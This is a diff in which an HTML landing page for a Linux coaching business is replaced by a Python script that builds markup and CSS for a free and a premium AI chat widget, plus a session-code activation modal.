@@ -1,708 +1,212 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinuxMaster - Professional Linux Coaching & Classes</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+# Read the current HTML file
+with open('/mnt/agents/upload/user_pasted_clipboard_long_content_as_file_!DOCTYPE html htm.txt', 'r') as f:
+    content = f.read()
+
+# Find the position before the closing body tag to insert the new dual-AI system
+# We'll replace the existing chat widget with a more sophisticated version
+
+# First, let's remove any existing chat widget code if present
+# and add the new dual-AI system
+
+new_chat_system = '''
+    <!-- Dual AI Chat System -->
+    <!-- Public AI Widget (Basic) -->
+    <div class="chat-widget public-ai" id="publicChatWidget">
+        <button class="chat-toggle public-toggle" onclick="togglePublicChat()">
+            <i class="fas fa-robot"></i>
+            <span class="chat-badge">FREE</span>
+        </button>
+        
+        <div class="chat-container public-container" id="publicChatContainer">
+            <div class="chat-header public-header">
+                <div class="chat-title">
+                    <i class="fas fa-graduation-cap"></i>
+                    <span>Linux Tips AI (Free)</span>
+                </div>
+                <button class="chat-close" onclick="togglePublicChat()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="chat-messages" id="publicChatMessages">
+                <div class="message ai-message">
+                    <div class="message-avatar public-avatar">
+                        <i class="fas fa-graduation-cap"></i>
+                    </div>
+                    <div class="message-content">
+                        <p><strong>Welcome to Linux Tips AI!</strong></p>
+                        <p style="margin-top: 0.5rem;">I can help with:</p>
+                        <ul style="margin-top: 0.5rem; padding-left: 1rem;">
+                            <li>Basic command tips</li>
+                            <li>General Linux concepts</li>
+                            <li>Getting started guides</li>
+                            <li>Common troubleshooting</li>
+                        </ul>
+                        <p style="margin-top: 0.5rem; color: var(--accent-orange);"><i class="fas fa-lock"></i> For advanced topics, book a session!</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="chat-input-area">
+                <div class="chat-input-wrapper">
+                    <input type="text" 
+                           class="chat-input" 
+                           id="publicChatInput" 
+                           placeholder="Ask a basic Linux question..."
+                           onkeypress="handlePublicChatKeypress(event)">
+                    <button class="chat-send public-send" onclick="sendPublicMessage()">
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+                <div class="chat-quick-actions">
+                    <button class="quick-btn" onclick="sendPublicQuick('What is Linux?')">What is Linux?</button>
+                    <button class="quick-btn" onclick="sendPublicQuick('Basic commands')">Basic Commands</button>
+                    <button class="quick-btn" onclick="sendPublicQuick('How to install software?')">Install Software</button>
+                </div>
+                <div class="upgrade-banner">
+                    <i class="fas fa-crown"></i>
+                    <span>Need advanced help? <a href="#pricing" onclick="togglePublicChat()">Book a session</a> for Premium AI!</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Premium AI Widget (For Students) -->
+    <div class="chat-widget premium-ai" id="premiumChatWidget" style="display: none;">
+        <button class="chat-toggle premium-toggle" onclick="togglePremiumChat()">
+            <i class="fas fa-crown"></i>
+            <span class="chat-badge premium-badge">PRO</span>
+        </button>
+        
+        <div class="chat-container premium-container" id="premiumChatContainer">
+            <div class="chat-header premium-header">
+                <div class="chat-title">
+                    <i class="fas fa-crown"></i>
+                    <span>LinuxMaster Pro AI</span>
+                </div>
+                <div class="session-timer" id="sessionTimer">Session: 00:00</div>
+                <button class="chat-close" onclick="togglePremiumChat()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="premium-tabs">
+                <button class="premium-tab active" onclick="switchTab('general')">General</button>
+                <button class="premium-tab" onclick="switchTab('distro')">Distro Deep Dive</button>
+                <button class="premium-tab" onclick="switchTab('cyber')">Cyber Security</button>
+                <button class="premium-tab" onclick="switchTab('cert')">Certification</button>
+            </div>
+            
+            <div class="chat-messages premium-messages" id="premiumChatMessages">
+                <div class="message ai-message">
+                    <div class="message-avatar premium-avatar">
+                        <i class="fas fa-crown"></i>
+                    </div>
+                    <div class="message-content">
+                        <p><strong>Welcome to LinuxMaster Pro AI!</strong></p>
+                        <p style="margin-top: 0.5rem;">You have access to:</p>
+                        <ul style="margin-top: 0.5rem; padding-left: 1rem;">
+                            <li>Advanced distro-specific knowledge</li>
+                            <li>Cybersecurity & penetration testing</li>
+                            <li>Certification exam prep (RHCSA, CEH, etc.)</li>
+                            <li>Enterprise deployment strategies</li>
+                            <li>Custom kernel compilation</li>
+                            <li>Advanced networking & security</li>
+                        </ul>
+                        <p style="margin-top: 0.5rem; color: var(--accent-green);"><i class="fas fa-check-circle"></i> Premium session active!</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="chat-input-area premium-input-area">
+                <div class="topic-selector">
+                    <select id="premiumTopic" onchange="updatePremiumContext()">
+                        <option value="general">General Linux</option>
+                        <option value="ubuntu">Ubuntu/Debian</option>
+                        <option value="rhel">RHEL/CentOS/Fedora</option>
+                        <option value="arch">Arch/Manjaro</option>
+                        <option value="gentoo">Gentoo/LFS</option>
+                        <option value="kali">Kali/Parrot (Security)</option>
+                        <option value="cyber">Cybersecurity</option>
+                        <option value="rhcsa">RHCSA Certification</option>
+                        <option value="ceh">CEH Certification</option>
+                        <option value="lpic">LPIC Certification</option>
+                    </select>
+                </div>
+                <div class="chat-input-wrapper">
+                    <input type="text" 
+                           class="chat-input premium-chat-input" 
+                           id="premiumChatInput" 
+                           placeholder="Ask advanced questions about your selected topic..."
+                           onkeypress="handlePremiumChatKeypress(event)">
+                    <button class="chat-send premium-send" onclick="sendPremiumMessage()">
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+                <div class="chat-quick-actions premium-quick-actions">
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('Advanced SELinux policies')">SELinux</button>
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('Kernel compilation steps')">Kernel</button>
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('Penetration testing methodology')">Pentesting</button>
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('RHCSA exam preparation')">RHCSA</button>
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('Network hardening')">Hardening</button>
+                    <button class="quick-btn premium-quick" onclick="sendPremiumQuick('Exploit development basics')">Exploits</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Session Activation Modal -->
+    <div class="modal" id="sessionModal">
+        <div class="modal-content session-modal-content">
+            <button class="modal-close" onclick="closeSessionModal()">&times;</button>
+            <div class="session-activation">
+                <i class="fas fa-crown" style="font-size: 3rem; color: var(--accent-orange); margin-bottom: 1rem;"></i>
+                <h2>Activate Premium AI Session</h2>
+                <p style="color: var(--text-secondary); margin: 1rem 0;">Enter your session code to unlock the Pro AI assistant with advanced knowledge.</p>
+                
+                <div class="session-input-group">
+                    <input type="text" id="sessionCode" placeholder="Enter session code (e.g., LM-XXXX-XXXX)" style="text-transform: uppercase;">
+                    <button class="btn btn-primary" onclick="activateSession()" style="margin-top: 1rem; width: 100%;">
+                        <i class="fas fa-unlock"></i> Activate Session
+                    </button>
+                </div>
+                
+                <div class="session-info" style="margin-top: 2rem; text-align: left; background: var(--bg-hover); padding: 1rem; border-radius: 8px;">
+                    <h4 style="margin-bottom: 0.5rem;"><i class="fas fa-info-circle"></i> What you get with Premium AI:</h4>
+                    <ul style="padding-left: 1.5rem; color: var(--text-secondary);">
+                        <li>Distro-specific deep technical knowledge</li>
+                        <li>Cybersecurity & penetration testing guides</li>
+                        <li>Certification exam preparation</li>
+                        <li>Enterprise deployment strategies</li>
+                        <li>Advanced troubleshooting</li>
+                        <li>Custom configuration help</li>
+                    </ul>
+                </div>
+                
+                <p style="margin-top: 1.5rem; font-size: 0.9rem;">
+                    Don't have a code? <a href="#pricing" onclick="closeSessionModal()" style="color: var(--accent);">Book a coaching session</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
     <style>
-        :root {
-            --bg-dark: #0d1117;
-            --bg-card: #161b22;
-            --bg-hover: #21262d;
-            --border: #30363d;
-            --text-primary: #e6edf3;
-            --text-secondary: #8b949e;
-            --accent: #58a6ff;
-            --accent-green: #3fb950;
-            --accent-orange: #f0883e;
-            --accent-purple: #a371f7;
-            --accent-red: #f85149;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-dark);
-            color: var(--text-primary);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-
-        /* Animated background grid */
-        .bg-grid {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(88, 166, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(88, 166, 255, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .bg-glow {
-            position: fixed;
-            width: 600px;
-            height: 600px;
-            border-radius: 50%;
-            filter: blur(100px);
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .glow-1 { top: -200px; left: -200px; background: var(--accent); }
-        .glow-2 { bottom: -200px; right: -200px; background: var(--accent-green); }
-
-        /* Navigation */
-        nav {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background: rgba(13, 17, 23, 0.9);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border);
-            z-index: 1000;
-            padding: 1rem 0;
-        }
-
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--accent);
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .logo i {
-            font-size: 1.8rem;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-            position: relative;
-        }
-
-        .nav-links a:hover {
-            color: var(--text-primary);
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--accent);
-            transition: width 0.3s;
-        }
-
-        .nav-links a:hover::after {
-            width: 100%;
-        }
-
-        /* Hero Section */
-        .hero {
-            position: relative;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 6rem 2rem 4rem;
-            z-index: 1;
-        }
-
-        .hero-content {
-            text-align: center;
-            max-width: 800px;
-        }
-
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            background: rgba(88, 166, 255, 0.1);
-            border: 1px solid rgba(88, 166, 255, 0.3);
-            padding: 0.5rem 1rem;
-            border-radius: 50px;
-            font-size: 0.9rem;
-            color: var(--accent);
-            margin-bottom: 2rem;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        .hero h1 {
-            font-size: 4rem;
-            font-weight: 800;
-            margin-bottom: 1.5rem;
-            line-height: 1.1;
-            background: linear-gradient(135deg, var(--text-primary) 0%, var(--accent) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .hero p {
-            font-size: 1.25rem;
-            color: var(--text-secondary);
-            margin-bottom: 2rem;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .cta-buttons {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 1rem 2rem;
-            border-radius: 8px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s;
-            cursor: pointer;
-            border: none;
-            font-size: 1rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .btn-primary {
-            background: var(--accent);
-            color: var(--bg-dark);
-        }
-
-        .btn-primary:hover {
-            background: #79b8ff;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(88, 166, 255, 0.3);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--text-primary);
-            border: 1px solid var(--border);
-        }
-
-        .btn-secondary:hover {
-            background: var(--bg-hover);
-            border-color: var(--accent);
-        }
-
-        /* Terminal Animation */
-        .terminal-window {
-            max-width: 700px;
-            margin: 3rem auto 0;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-        }
-
-        .terminal-header {
-            background: var(--bg-hover);
-            padding: 0.75rem 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .terminal-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-        }
-
-        .dot-red { background: var(--accent-red); }
-        .dot-yellow { background: #f0883e; }
-        .dot-green { background: var(--accent-green); }
-
-        .terminal-body {
-            padding: 1.5rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
-            line-height: 1.8;
-            min-height: 200px;
-        }
-
-        .terminal-line {
-            opacity: 0;
-            animation: fadeIn 0.5s forwards;
-        }
-
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
-
-        .prompt { color: var(--accent-green); }
-        .command { color: var(--text-primary); }
-        .output { color: var(--text-secondary); }
-        .highlight { color: var(--accent); }
-
-        /* Pricing Section */
-        .pricing {
-            padding: 6rem 2rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .section-header {
-            text-align: center;
-            margin-bottom: 4rem;
-        }
-
-        .section-header h2 {
-            font-size: 2.5rem;
-            margin-bottom: 1rem;
-            color: var(--text-primary);
-        }
-
-        .section-header p {
-            color: var(--text-secondary);
-            font-size: 1.1rem;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .pricing-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .pricing-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 2rem;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .pricing-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, var(--accent), var(--accent-green));
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .pricing-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-        }
-
-        .pricing-card:hover::before {
-            opacity: 1;
-        }
-
-        .distro-icon {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-        }
-
-        .distro-name {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-
-        .distro-desc {
-            color: var(--text-secondary);
-            margin-bottom: 1.5rem;
-            font-size: 0.95rem;
-        }
-
-        .price {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--accent);
-            margin-bottom: 0.5rem;
-        }
-
-        .price span {
-            font-size: 1rem;
-            color: var(--text-secondary);
-            font-weight: 400;
-        }
-
-        .features {
-            list-style: none;
-            margin: 1.5rem 0;
-        }
-
-        .features li {
-            padding: 0.5rem 0;
-            color: var(--text-secondary);
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .features li i {
-            color: var(--accent-green);
-            font-size: 0.8rem;
-        }
-
-        .popular-badge {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: linear-gradient(135deg, var(--accent), var(--accent-purple));
-            padding: 0.25rem 0.75rem;
-            border-radius: 50px;
-            font-size: 0.75rem;
-            font-weight: 700;
-        }
-
-        /* Calculator Section */
-        .calculator {
-            padding: 6rem 2rem;
-            background: var(--bg-card);
-            position: relative;
-            z-index: 1;
-        }
-
-        .calc-container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: var(--bg-dark);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 3rem;
-        }
-
-        .calc-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 0.5rem;
-        }
-
-        .form-group label {
-            font-weight: 600;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        select, input[type="number"] {
-            padding: 0.75rem;
-            background: var(--bg-hover);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-family: 'Inter', sans-serif;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
-
-        select:focus, input:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
-        .calc-result {
-            background: linear-gradient(135deg, rgba(88, 166, 255, 0.1), rgba(63, 185, 80, 0.1));
-            border: 1px solid var(--accent);
-            border-radius: 12px;
-            padding: 2rem;
-            text-align: center;
-        }
-
-        .calc-result h3 {
-            font-size: 1rem;
-            color: var(--text-secondary);
-            margin-bottom: 0.5rem;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-        }
-
-        .total-price {
-            font-size: 3rem;
-            font-weight: 800;
-            color: var(--accent);
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .savings {
-            color: var(--accent-green);
-            margin-top: 0.5rem;
-            font-weight: 600;
-        }
-
-        /* Features Section */
-        .features-section {
-            padding: 6rem 2rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .features-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-        }
-
-        .feature-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 2rem;
-            text-align: center;
-            transition: all 0.3s;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent);
-        }
-
-        .feature-icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(88, 166, 255, 0.1);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            font-size: 1.5rem;
-            color: var(--accent);
-        }
-
-        .feature-card h3 {
-            margin-bottom: 0.5rem;
-            color: var(--text-primary);
-        }
-
-        .feature-card p {
-            color: var(--text-secondary);
-            font-size: 0.95rem;
-        }
-
-        /* Footer */
-        footer {
-            background: var(--bg-card);
-            border-top: 1px solid var(--border);
-            padding: 3rem 2rem 2rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 3rem;
-            margin-bottom: 2rem;
-        }
-
-        .footer-section h4 {
-            color: var(--text-primary);
-            margin-bottom: 1rem;
-            font-size: 1.1rem;
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section ul li {
-            margin-bottom: 0.5rem;
-        }
-
-        .footer-section a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .footer-section a:hover {
-            color: var(--accent);
-        }
-
-        .footer-bottom {
-            text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border);
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 2rem;
-            max-width: 500px;
-            width: 90%;
-            position: relative;
-            animation: slideUp 0.3s;
-        }
-
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: none;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: color 0.3s;
-        }
-
-        .modal-close:hover {
-            color: var(--text-primary);
-        }
-
-        .modal h2 {
-            margin-bottom: 1rem;
-            color: var(--text-primary);
-        }
-
-        .modal-form {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-
-        .modal-form input,
-        .modal-form select,
-        .modal-form textarea {
-            padding: 0.75rem;
-            background: var(--bg-hover);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-family: 'Inter', sans-serif;
-        }
-
-        .modal-form textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 2.5rem; }
-            .calc-grid { grid-template-columns: 1fr; }
-            .nav-links { display: none; }
-            .pricing-grid { grid-template-columns: 1fr; }
-        }
-
-        /* Scroll animations */
-        .fade-in {
-            opacity: 0;
-            transform: translateY(30px);
-            transition: opacity 0.6s, transform 0.6s;
-        }
-
-        .fade-in.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* AI Chat Widget Styles */
-        .chat-widget {
+        /* Dual AI Chat System Styles */
+        
+        /* Public AI Styles */
+        .public-ai {
             position: fixed;
             bottom: 2rem;
             right: 2rem;
             z-index: 3000;
         }
 
-        .chat-toggle {
+        .public-toggle {
             width: 60px;
             height: 60px;
             border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent), var(--accent-purple));
+            background: linear-gradient(135deg, var(--accent), var(--accent-green));
             border: none;
             color: white;
             font-size: 1.5rem;
@@ -712,29 +216,24 @@
             position: relative;
         }
 
-        .chat-toggle:hover {
+        .public-toggle:hover {
             transform: scale(1.1);
             box-shadow: 0 6px 30px rgba(88, 166, 255, 0.6);
         }
 
-        .chat-notification {
+        .chat-badge {
             position: absolute;
-            top: -5px;
+            bottom: -5px;
             right: -5px;
-            background: var(--accent-red);
+            background: var(--accent-green);
             color: white;
-            font-size: 0.75rem;
+            font-size: 0.65rem;
             font-weight: bold;
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse 2s infinite;
+            padding: 0.2rem 0.5rem;
+            border-radius: 10px;
         }
 
-        .chat-container {
+        .public-container {
             position: absolute;
             bottom: 80px;
             right: 0;
@@ -747,44 +246,160 @@
             display: none;
             flex-direction: column;
             overflow: hidden;
-            animation: slideUp 0.3s;
         }
 
-        .chat-container.active {
+        .public-container.active {
             display: flex;
         }
 
-        .chat-header {
-            background: linear-gradient(135deg, var(--accent), var(--accent-purple));
+        .public-header {
+            background: linear-gradient(135deg, var(--accent), var(--accent-green));
             padding: 1rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .chat-title {
+        .public-avatar {
+            background: linear-gradient(135deg, var(--accent), var(--accent-green)) !important;
+        }
+
+        .public-send {
+            background: var(--accent-green) !important;
+        }
+
+        .upgrade-banner {
+            background: linear-gradient(135deg, rgba(240, 136, 62, 0.1), rgba(240, 136, 62, 0.2));
+            border: 1px solid var(--accent-orange);
+            border-radius: 8px;
+            padding: 0.75rem;
+            margin-top: 0.75rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
-            color: white;
+            font-size: 0.85rem;
+        }
+
+        .upgrade-banner i {
+            color: var(--accent-orange);
+        }
+
+        .upgrade-banner a {
+            color: var(--accent-orange);
+            text-decoration: underline;
             font-weight: 600;
         }
 
-        .chat-close {
+        /* Premium AI Styles */
+        .premium-ai {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            z-index: 3000;
+        }
+
+        .premium-toggle {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-orange), #ffd700);
+            border: 3px solid #ffd700;
+            color: white;
+            font-size: 1.8rem;
+            cursor: pointer;
+            box-shadow: 0 4px 25px rgba(240, 136, 62, 0.5);
+            transition: all 0.3s;
+            position: relative;
+            animation: premiumPulse 2s infinite;
+        }
+
+        @keyframes premiumPulse {
+            0%, 100% { box-shadow: 0 4px 25px rgba(240, 136, 62, 0.5); }
+            50% { box-shadow: 0 4px 40px rgba(240, 136, 62, 0.8); }
+        }
+
+        .premium-toggle:hover {
+            transform: scale(1.15);
+        }
+
+        .premium-badge {
+            background: #ffd700 !important;
+            color: var(--bg-dark) !important;
+            font-weight: 800;
+        }
+
+        .premium-container {
+            position: absolute;
+            bottom: 90px;
+            right: 0;
+            width: 450px;
+            height: 600px;
+            background: var(--bg-card);
+            border: 2px solid var(--accent-orange);
+            border-radius: 16px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.6);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .premium-container.active {
+            display: flex;
+        }
+
+        .premium-header {
+            background: linear-gradient(135deg, var(--accent-orange), #ff6b35);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+
+        .session-timer {
+            position: absolute;
+            right: 3rem;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .premium-avatar {
+            background: linear-gradient(135deg, var(--accent-orange), #ffd700) !important;
+        }
+
+        .premium-tabs {
+            display: flex;
+            background: var(--bg-hover);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .premium-tab {
+            flex: 1;
+            padding: 0.75rem;
             background: none;
             border: none;
-            color: white;
-            font-size: 1.2rem;
+            color: var(--text-secondary);
             cursor: pointer;
-            opacity: 0.8;
-            transition: opacity 0.3s;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+            border-bottom: 2px solid transparent;
         }
 
-        .chat-close:hover {
-            opacity: 1;
+        .premium-tab:hover {
+            color: var(--text-primary);
+            background: var(--bg-card);
         }
 
-        .chat-messages {
+        .premium-tab.active {
+            color: var(--accent-orange);
+            border-bottom-color: var(--accent-orange);
+            background: var(--bg-card);
+        }
+
+        .premium-messages {
             flex: 1;
             overflow-y: auto;
             padding: 1rem;
@@ -793,6 +408,84 @@
             gap: 1rem;
         }
 
+        .topic-selector {
+            padding: 0.5rem 1rem;
+            background: var(--bg-dark);
+            border-top: 1px solid var(--border);
+        }
+
+        .topic-selector select {
+            width: 100%;
+            padding: 0.5rem;
+            background: var(--bg-hover);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-size: 0.9rem;
+        }
+
+        .premium-input-area {
+            background: var(--bg-dark);
+            border-top: 1px solid var(--border);
+        }
+
+        .premium-chat-input {
+            border-color: var(--accent-orange) !important;
+        }
+
+        .premium-chat-input:focus {
+            border-color: #ffd700 !important;
+            box-shadow: 0 0 10px rgba(240, 136, 62, 0.3);
+        }
+
+        .premium-send {
+            background: linear-gradient(135deg, var(--accent-orange), #ffd700) !important;
+            color: var(--bg-dark) !important;
+        }
+
+        .premium-quick {
+            background: rgba(240, 136, 62, 0.1) !important;
+            border-color: var(--accent-orange) !important;
+            color: var(--accent-orange) !important;
+        }
+
+        .premium-quick:hover {
+            background: rgba(240, 136, 62, 0.2) !important;
+        }
+
+        /* Session Modal */
+        .session-modal-content {
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .session-activation h2 {
+            color: var(--accent-orange);
+        }
+
+        .session-input-group {
+            margin-top: 1.5rem;
+        }
+
+        .session-input-group input {
+            width: 100%;
+            padding: 1rem;
+            background: var(--bg-hover);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .session-input-group input:focus {
+            outline: none;
+            border-color: var(--accent-orange);
+        }
+
+        /* Message Styles */
         .message {
             display: flex;
             gap: 0.75rem;
@@ -816,17 +509,7 @@
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
-        }
-
-        .ai-message .message-avatar {
-            background: linear-gradient(135deg, var(--accent), var(--accent-purple));
             color: white;
-        }
-
-        .user-message .message-avatar {
-            background: var(--bg-hover);
-            color: var(--accent);
-            border: 1px solid var(--accent);
         }
 
         .message-content {
@@ -884,7 +567,6 @@
         }
 
         .chat-send:hover {
-            background: #79b8ff;
             transform: scale(1.05);
         }
 
@@ -943,926 +625,195 @@
             overflow-x: auto;
         }
 
+        .premium-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, rgba(240, 136, 62, 0.2), rgba(255, 215, 0, 0.2));
+            border: 1px solid var(--accent-orange);
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: var(--accent-orange);
+            margin-left: 0.5rem;
+        }
+
         @media (max-width: 480px) {
-            .chat-container {
+            .public-container, .premium-container {
                 width: calc(100vw - 2rem);
-                height: 70vh;
                 right: -1rem;
+            }
+            .premium-container {
+                height: 70vh;
             }
         }
     </style>
-</head>
-<body>
